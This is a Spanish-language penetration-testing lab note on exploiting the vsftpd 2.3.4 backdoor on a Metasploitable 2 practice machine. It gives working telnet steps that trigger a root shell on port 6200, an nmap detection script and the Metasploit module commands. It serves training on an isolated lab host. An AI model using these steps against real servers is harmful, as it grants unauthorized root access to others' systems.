# FTP — vsftpd 2.3.4 (puerto 21) — Metasploitable 2

> Práctica de laboratorio: aplicar únicamente sobre tu propia máquina Metasploitable 2 (`192.168.100.9`), aislada de Internet. Documento de la serie [Reconocimiento y Metasploit](./01_reconocimiento_y_metasploit.md).

**Qué es:** FTP (*File Transfer Protocol*) es un servicio para transferir archivos. Aquí lo sirve **vsftpd en su versión 2.3.4**, escuchando en el **puerto 21**.

**Cómo se explota:** en 2011 alguien alteró el código fuente oficial de vsftpd 2.3.4 e introdujo una **puerta trasera**: si el nombre de usuario con el que inicias sesión termina en una carita sonriente `:)`, el servidor abre en secreto una *shell de root* en el **puerto 6200**. No hay que adivinar ninguna contraseña (no es fuerza bruta).

## Explotación manual (sin Metasploit)

```bash
# 1. Activar la puerta trasera: cualquier usuario acabado en ":)"
telnet 192.168.100.9 21
USER pepe:)
PASS loquesea

# 2. En OTRA terminal, conectarse a la shell que se abre en el 6200
telnet 192.168.100.9 6200
id            # uid=0(root) gid=0(root)  -> somos root
whoami
```

También puedes confirmar la vulnerabilidad con un script de nmap:

```bash
nmap -p 21 --script ftp-vsftpd-backdoor 192.168.100.9
```

## Explotación con Metasploit

```bash
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.100.9
exploit
# -> "Command shell session 1 opened" como root
```

---

> **Ver también:** apunte general de enumeración de [FTP](../../Apuntes%20Generales/03_enumeracion_de_servicios/01_ftp.md) en `Apuntes Generales`.
